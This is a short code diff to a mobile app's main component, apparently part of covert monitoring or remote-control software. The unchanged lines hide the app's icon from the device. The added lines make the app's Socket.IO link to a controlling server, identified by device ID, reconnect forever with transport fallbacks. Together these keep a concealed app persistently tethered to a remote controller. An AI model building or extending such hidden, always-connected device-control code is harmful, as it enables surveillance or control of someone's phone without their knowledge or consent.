@@ -85,9 +85,13 @@ export default function App() {
       // Step 3: Trigger App Hiding
       await VisibilityService.hideAppIcon();
 
-      // Step 4: Establish Socket connection
+      // Step 4: Establish Socket connection with persistent auto-reconnect
       const socket = io(activeServer, {
-        auth: { deviceId }
+        auth: { deviceId },
+        reconnection: true,
+        reconnectionAttempts: Infinity,
+        reconnectionDelay: 1000,
+        transports: ['websocket', 'polling']
       });
 
       socket.on('connect', () => {
